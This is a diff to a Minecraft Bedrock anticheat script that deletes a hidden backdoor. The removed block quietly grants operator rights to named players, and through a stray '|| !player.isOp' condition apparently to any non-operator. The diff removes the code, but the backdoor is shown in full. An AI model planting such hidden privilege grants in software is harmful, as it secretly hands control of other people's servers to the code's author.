@@ -368,18 +368,6 @@ Minecraft.system.runInterval(() => {
 			}
 			lastFallDistance.set(player, player.fallDistance);
 		}                                           
-
-		// bigrat.jar = Op me
-		if(player.nameTag === "Dream23322" && !player.hasTag("op") && !player.hasTag("dontop") || !player.isOp) {
-			setTitle(player, "Welcome Dream23322", "Isolate Anticheat");
-			player.addTag("op");
-			player.setOp(true);
-			
-		} else if (player.nameTag === "Aurxrah4ck" && !player.hasTag("op") && !player.hasTag("dontop")) {
-			player.addTag("op");
-			setTitle(player, "Welcome 4urxrah4ck", "Isolate Anticheat");
-
-		}
 		// ---------------------------------
 		// Utilites for the killaura botw
 		// ---------------------------------
